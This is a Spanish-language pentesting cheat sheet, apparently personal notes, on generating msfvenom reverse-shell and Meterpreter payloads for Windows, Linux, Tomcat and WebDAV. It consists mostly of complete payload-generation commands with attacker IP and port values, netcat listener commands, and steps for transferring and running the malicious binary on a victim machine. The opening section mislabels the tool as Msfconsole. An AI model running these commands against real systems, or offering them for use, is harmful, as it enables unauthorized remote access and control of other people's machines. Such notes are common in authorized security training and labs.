# Msfvenom 

Tags: #Msfvenom #WebDav #Tomcat 

Msfconsole: Es una utilidad de línea de comando que puede ser usada para generar y encodear payloads MSF para varios sistemas operativos, así, como servidores web. Es la combinación de dos utilidades: Msfpayload y Msfencode. Podemos utilizar Msfvenom para generar payloads maliciosos en Meterpreter que pueden ser transferidos al sistema del cliente. Una vez ejecutados, harán una conexión a nuestro payload handler y nos proveerá un acceso remoto al sistema target.  

### Windows Meterpreter

* [MsfVenom-Payload](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=172.0.0.1 LPORT=443 -f exe -o shell.exe 

	# p = Payload
	# f = Formato
	# o = Exportar como 
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
	# platform = Plataforma a usar
	# a = Arquitectura

❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f exe > shell.exe
```

Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un servidor HTTP y en la maquina victima lo podemos descargar desde el navegador colocando la IP del servicio compartido

```bash 
❯ rlwrap nc -nlvp 443   # Nos ponemos en escucha por Netcat
```
* Ejecutamos el binario que subimos a Windows y ganamos acceso

### Linux Meterpreter

```python 
# Esto funciona cuando tenemos el usuario y passwd de un usuario normal

❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f elf > hola.elf

	# p = Payload
	# f = Formato
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
```

* Nos ponemos en escucha por Netcat:dows
```bash 
❯ nc -nlvp 443
```
* Ejecutamos el binario que subimos a Linux y ganamos acceso

## Tomcat 

```bash 
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o reverse.war

	# p = Payload
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port 'Atacante'
	# f = Formato
	# o = Exportar como 
```

## WebDAV

```bash 
# Al payload le llamaremos shell.asp
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.68.1 LPORT=1234 -f asp > shell.asp
	# p = payload 
	# f = formato
```